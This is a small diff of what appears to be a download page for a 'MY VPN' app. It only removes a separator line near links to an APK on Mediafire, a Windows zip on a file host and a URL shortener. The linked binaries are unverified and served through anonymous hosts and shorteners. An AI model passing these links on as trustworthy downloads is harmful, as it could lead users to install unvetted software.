@@ -7,8 +7,6 @@ short.gfix4600.workers.dev/7SnGXj
  [old veraion](https://www.mediafire.com/file/tkjuj75v8gh8s5q/MY+VPN+1.9.0.apk/file)
 
 
----
-
 🟢 [**Windows**](http://uplnk.com/f/f99ba404/my_vpn.windows.zip)
 
 _____________________________________________________
